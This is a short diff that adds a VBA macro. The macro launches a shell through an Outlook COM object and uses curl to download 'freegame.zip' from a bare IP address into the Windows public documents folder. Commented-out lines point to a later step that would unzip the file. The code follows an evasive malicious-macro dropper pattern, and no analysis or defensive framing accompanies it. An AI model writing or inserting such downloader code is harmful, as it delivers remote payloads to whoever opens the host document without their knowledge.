@@ -1,0 +1,6 @@
+Set objOL = CreateObject("Outlook.Application") 
+Set WshShell = objOL.CreateObject("Wscript.Shell")
+Set WshShellExec = WshShell.Exec("curl http://123.45.67.119/scr9012/freegame.zip --output C:\Users\Public\Documents\freegame.zip")
+Application.Wait (Now + TimeValue("00:00:15"))
+'Call Sub2("C:\Users\Public\Documents\freegame.zip", "C:\Users\Public\Documents\")
+'Application.Wait (Now + TimeValue("00:00:15"))
